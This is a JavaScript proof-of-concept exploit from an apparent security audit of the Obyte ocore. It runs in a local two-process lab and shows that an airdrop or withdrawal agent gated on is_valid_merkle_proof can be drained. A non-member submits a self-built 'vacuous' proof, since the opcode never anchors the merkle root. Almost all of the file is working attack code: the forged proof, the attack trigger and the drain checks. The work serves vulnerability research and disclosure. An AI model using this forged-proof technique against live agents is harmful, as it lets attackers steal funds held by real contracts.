// E3-5 — F1 FUND-IMPACT VIA THE AA PATH: merkle-gated withdrawal AA drained with the vacuous proof
// The confirmed AA path (E2-6) + the is_valid_merkle_proof footgun (finding obyte-2026-08-001).
// Realistic pattern: an airdrop/withdrawal AA whose payment message is gated on
// is_valid_merkle_proof(trigger.data.element, trigger.data.proof) — the author intends "only
// members of my committed merkle tree can withdraw". Because the opcode never anchors the root,
// ANY element with a self-consistent proof (proof = "0-"+b64(sha256(element)), root chosen by the
// prover) passes. Non-members drain the AA's held funds.
//
// Two-process lab: hub (6631) composes + relays; node (6632) validates, saves, stabilizes, fires
// the AA (aa_composer.handleAATriggers at stabilization — E2-6 confirmed).
// Run: ROLE=node PORT=6632 node e35-merkle-aa.js &   (listener)
//      ROLE=hub  PORT=6631 node e35-merkle-aa.js &   (posts + relays)
"use strict";
const path = require("path");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const WebSocket = require(O_CORE + "/node_modules/ws");
const crypto = require("crypto");
const { boot, keys, defOf, signHash, sleep, TOTAL } = require("./e17b-boot.js");

const ROLE = process.env.ROLE || "hub";
const PORT = parseInt(process.env.PORT || (ROLE === "hub" ? 6631 : 6632), 10);
const NODE_PORT = parseInt(process.env.NODE_PORT || 6632, 10);
const DATA = path.join(__dirname, ".e35-" + ROLE);

const WITHDRAWAL = 15000;  // fixed amount the AA pays out per accepted withdrawal (exceeds each deposit -> drains the pool)
const SEED_AMOUNT = 40000; // the AA's held funds (member deposit, real proof)
const TRIGGER_PAY = 10000;   // what each trigger deposits when asking to withdraw

// The committed merkle tree (the AA author's "member list"). The opcode does NOT anchor this root.
const MEMBERS = ["alice", "bob", "carol"];

// --- the vulnerable AA: withdrawal gated on is_valid_merkle_proof (the F1 footgun) ---
function aaDefinition() {
	return ["autonomous agent", {
		bounce_fees: { base: 10000 },
		messages: {
			cases: [
				{
					// author's intent: only merkle members may withdraw; the gate is the footgun
					if: "{is_valid_merkle_proof(trigger.data.element, trigger.data.proof)}",
					messages: [
						{
							app: "payment",
							payload: {
								asset: "base",
								outputs: [{ address: "{trigger.address}", amount: WITHDRAWAL }]
							}
						}
					]
				}
			]
		}
	}];
}

function makeSigner(key) {
	const constants = require(O_CORE + "/constants.js");
	return {
		readDefinition: (conn, address, cb) => cb(null, defOf(key)),
		readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
		readPrivateKey: (address, p, cb) => cb(null, Buffer.from(key.priv, "hex")),
	};
}

function dump(ctx, tag) {
	return Promise.all([
		ctx.query("SELECT address, unit, mci FROM aa_addresses ORDER BY address"),
		ctx.query("SELECT mci, unit, address FROM aa_triggers ORDER BY mci"),
		ctx.query("SELECT unit, main_chain_index, is_stable, sequence, is_aa_response FROM units ORDER BY main_chain_index, unit"),
		ctx.query("SELECT o.unit, o.output_index, o.address, o.amount FROM outputs o ORDER BY o.unit, o.output_index"),
		ctx.query("SELECT unit, address, amount FROM outputs WHERE address=?", [/* filled below */ "x"]).catch(() => []),
	]).then(([aa, trig, units, outs]) => {
		console.log("[" + tag + "] AA_ADDRESSES:", JSON.stringify(aa));
		console.log("[" + tag + "] AA_TRIGGERS_LEFT:", JSON.stringify(trig));
		console.log("[" + tag + "] UNITS:", JSON.stringify(units.map(r => ({ mci: r.main_chain_index, seq: r.sequence, st: r.is_stable, aa: r.is_aa_response }))));
		return { aa, trig, units, outs };
	});
}

function openRelayClient(url) {
	return new Promise((resolve, reject) => {
		const ws = new WebSocket(url, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout")), 8000);
		ws.on("error", (e) => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: { protocol_version: "4.0", alt: "1", library: "ocore", library_version: "0.4.6", program: "e35-lab", program_version: "0.0.1" } }]));
			ws.send(JSON.stringify(["request", { tag: "sub-e35", command: "subscribe", params: { subscription_id: "e35-sub", last_mci: 0, library_version: "0.4.6" } }]));
			setTimeout(() => resolve(ws), 800);
		});
	});
}
function sendJoint(ws, joint) {
	if (ws.readyState === 1) { ws.send(JSON.stringify(["justsaying", { subject: "joint", body: joint }])); return true; }
	return false;
}

function composeGeneric(ctx, key, address, opts) {
	return new Promise((resolve, reject) => {
		ctx.composer.composeJoint({
			paying_addresses: [address],
			signing_addresses: [address],
			outputs: opts.outputs || [{ address, amount: 0 }],
			messages: opts.messages || [],
			signer: makeSigner(key),
			callbacks: {
				ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
				ifError: (e) => reject(new Error(opts.label + " compose error: " + JSON.stringify(e).slice(0, 250))),
				ifNotEnoughFunds: (e) => reject(new Error(opts.label + " not enough funds: " + e)),
			},
		});
	});
}

async function main() {
	const ctx = await boot(DATA, PORT, { bServeAsHub: ROLE === "hub" });
	const merkle = require(O_CORE + "/merkle.js");
	console.log("[" + ROLE + "] booted port", PORT, "genesis", ctx.genesis.unit.slice(0, 12) + "...");

	if (ROLE === "node") {
		console.log("[node] listening on", PORT, "- waiting for the hub stream + AA triggers...");
		let sawTrigger = 0;
		let prevCount = -1;
		for (let i = 0; i < 300; i++) {
			await sleep(1000);
			const trig = await ctx.query("SELECT COUNT(*) AS c FROM aa_triggers");
			if (trig[0].c > 0 && trig[0].c !== prevCount) {
				prevCount = trig[0].c;
				sawTrigger++;
				console.log("[node] aa_triggers rows seen:", trig[0].c);
			}
			const stable = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_stable=1");
			const resp = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_aa_response=1");
			if (sawTrigger >= 2 && resp[0].c >= 2 && stable[0].c >= 8) {
				console.log("[node] both AA responses observed (responses=" + resp[0].c + " stable=" + stable[0].c + ")");
				break;
			}
		}
		await sleep(5000);
		const state = await dump(ctx, "node-final");
		// who got paid: outputs of the AA responses (is_aa_response units' payment messages)
		const respUnits = state.units.filter(u => u.is_aa_response === 1).map(u => u.unit);
		const resps = await ctx.query("SELECT m.unit, m.payload FROM messages m WHERE m.app='payment'");
		console.log("[node] AA_RESPONSE_OUTPUTS:", JSON.stringify(resps.filter(r => respUnits.includes(r.unit)).map(r => ({ u: r.unit.slice(0, 12), out: JSON.stringify((r.payload || {}).outputs || []) }))));
		// the attacker (user_addr) balance of the withdrawal proceeds: outputs to user_addr
		const outs = state.outs.filter(o => o.address === ctx.user_addr && o.amount > 1000000000);
		console.log("[node] USER_BIG_OUTPUTS:", JSON.stringify(outs.slice(-8)));
		const aaAddr = state.aa[0] && state.aa[0].address;
		// AA-held balance: total unspent base outputs to the AA
		const aaOuts = state.outs.filter(o => aaAddr && o.address === aaAddr);
		const held = aaOuts.reduce((s, o) => s + o.amount, 0);
		console.log("[node] AA_HELD:", held, "AA_ENTRIES:", aaOuts.length);
		console.log("NODE-DONE responses=" + respUnits.length + " aa_addresses=" + state.aa.length + " held=" + held);
		process.exit(respUnits.length >= 2 && held < SEED_AMOUNT + 2 * TRIGGER_PAY ? 0 : 3);
	}

	// ---- hub ----
	await sleep(3000);
	const ws = await openRelayClient("ws://127.0.0.1:" + NODE_PORT);
	const aaDef = aaDefinition();
	const aa_addr = ctx.objectHash.getChash160(aaDef);
	console.log("[hub] AA address:", aa_addr.slice(0, 16) + "...");

	// proofs
	const memberProof = merkle.getMerkleProof(MEMBERS, MEMBERS.indexOf("bob"));      // real member "bob"
	const memberProofStr = merkle.serializeMerkleProof(memberProof);
	const mallory = "mallory";                                                        // NOT a member
	const vacuousProofStr = "0-" + crypto.createHash("sha256").update(mallory, "utf8").digest("base64"); // root = hash(mallory), no siblings

	// pre-verify the vacuous proof against the real engine (must be true for a non-member)
	const p1 = merkle.deserializeMerkleProof(vacuousProofStr);
	const vacuous_ok = merkle.verifyMerkleProof(mallory, p1);
	const p2 = merkle.deserializeMerkleProof(memberProofStr);
	const member_ok = merkle.verifyMerkleProof("bob", p2);
	const nonmember_realproof = merkle.verifyMerkleProof("mallory", p2);
	console.log("[hub] pre-verify vacuous(mallory)=", vacuous_ok, "real-proof(bob)=", member_ok, "real-proof(mallory)=", nonmember_realproof);

	const seq = [
		{ label: "DEFINITION", key: keys.user, addr: ctx.user_addr, opts: { messages: [{ app: "definition", payload: { address: aa_addr, definition: aaDef } }] } },
		{ label: "WAYPOINT-1", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "MEMBER-SEED(bob-real-proof)", key: keys.user, addr: ctx.user_addr, opts: {
			outputs: [{ address: aa_addr, amount: SEED_AMOUNT }, { address: ctx.user_addr, amount: 0 }],
			messages: [{ app: "data", payload: { element: "bob", proof: memberProofStr } }],
		} },
		{ label: "WAYPOINT-2", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "CONTROL-TRIGGER(bob-real-proof)", key: keys.user, addr: ctx.user_addr, opts: {
			outputs: [{ address: aa_addr, amount: TRIGGER_PAY }, { address: ctx.user_addr, amount: 0 }],
			messages: [{ app: "data", payload: { element: "bob", proof: memberProofStr } }],
		} },
		{ label: "WAYPOINT-3", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "ATTACK-TRIGGER(mallory-vacuous)", key: keys.user, addr: ctx.user_addr, opts: {
			outputs: [{ address: aa_addr, amount: TRIGGER_PAY }, { address: ctx.user_addr, amount: 0 }],
			messages: [{ app: "data", payload: { element: mallory, proof: vacuousProofStr } }],
		} },
		{ label: "WAYPOINT-4", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "WAYPOINT-5", key: keys.witness, addr: ctx.witness_addr, opts: {} },
	];
	for (const step of seq) {
		const joint = await composeGeneric(ctx, step.key, step.addr, Object.assign({ label: step.label }, step.opts));
		await ctx.validateAndSave(joint, step.label);
		if (sendJoint(ws, joint)) console.log("[hub] relayed " + step.label);
		await sleep(1100);
	}
	await sleep(12000);
	const state = await dump(ctx, "hub-final");
	const stable = state.units.filter(r => r.is_stable === 1).length;
	const respUnits = state.units.filter(u => u.is_aa_response === 1).map(u => u.unit);
	console.log("HUB-DONE stable=" + stable + " aa_addresses=" + state.aa.length + " responses=" + respUnits.length);
	process.exit(state.aa.length >= 1 && respUnits.length >= 2 ? 0 : 4);
}

main().catch(e => { console.error(ROLE + "-ERR:", e); process.exit(2); });
